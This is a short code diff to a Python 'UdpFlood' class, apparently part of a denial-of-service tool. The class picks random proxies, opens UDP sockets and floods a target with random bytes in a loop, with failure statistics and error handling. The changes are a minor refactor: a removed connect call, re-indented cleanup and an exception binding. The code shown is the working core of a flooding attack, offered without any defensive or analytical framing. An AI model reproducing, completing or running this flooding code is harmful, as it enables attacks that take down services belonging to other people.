@@ -26,7 +26,6 @@ class UdpFlood:
     def create_connection(self) -> socket:
         self._proxy = self._ctx.proxy_manager.get_random_proxy()
         conn = self._ctx.sock_manager.create_udp_socket()
-        conn.connect(self._target)
 
         return conn
 
@@ -36,8 +35,8 @@ class UdpFlood:
             while self.sendto(udp_conn):
                 continue
 
-        self._ctx.Statistic.connect.status_failed()
-        self._ctx.sock_manager.close_socket()
+            self._ctx.Statistic.connect.status_failed()
+            self._ctx.sock_manager.close_socket()
 
     def sendto(self, sock: socket) -> bool:
         send_bytes = generate_random_bytes(
@@ -45,7 +44,7 @@ class UdpFlood:
             self._ctx.max_random_packet_len)
         try:
             sent = sock.sendto(send_bytes, self._target)
-        except socket.gaierror:
+        except socket.gaierror as e:
             self._ctx.add_error(Errors('Send UDP packet', GETTING_SERVER_IP_ERROR_MSG))
         except Exception as e:
             self._ctx.add_error(Errors('TCP send Err', e))
